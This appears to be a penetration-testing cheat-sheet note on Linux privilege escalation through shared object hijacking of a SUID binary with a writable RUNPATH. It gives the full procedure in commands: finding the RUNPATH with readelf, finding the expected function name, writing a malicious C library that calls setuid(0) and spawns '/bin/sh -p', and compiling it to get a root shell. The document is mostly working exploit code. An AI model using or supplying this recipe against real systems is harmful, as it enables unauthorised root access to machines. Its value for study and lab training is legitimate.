# Shared Object Hijacking

Interesting if we find a SUID binary

It is possible to load shared libraries from custom locations. One such setting is the `RUNPATH` configuration. Libraries in this folder are given preference over other folders

```shellscript
# Check shared objects required by a binary
ldd <BINARY> 

# Check which directory is the RUNPATH => if this directory is writeable by our user
# we can abuse it by placing a malicious library which will take precedence over other 
# folders because entries in this file are checked first
readelf -d payroll  | grep PATH

# Copy an existing librairy inside the RUNPATH folder with the required name
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

# Run the binary => we are looking for an error to understand what funtion should be called
./<BINARY>

# Write an exploit with the function name being the one from the command above
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void <FUNC_NAME>() {
    printf("Malicious library loaded\\n");
    setuid(0);
    system("/bin/sh -p");
}

# Compile the exploit into the wanted shared library 
gcc src.c -fPIC -shared -o /development/libshared.so

# Running the binary again gives us a root shell
```
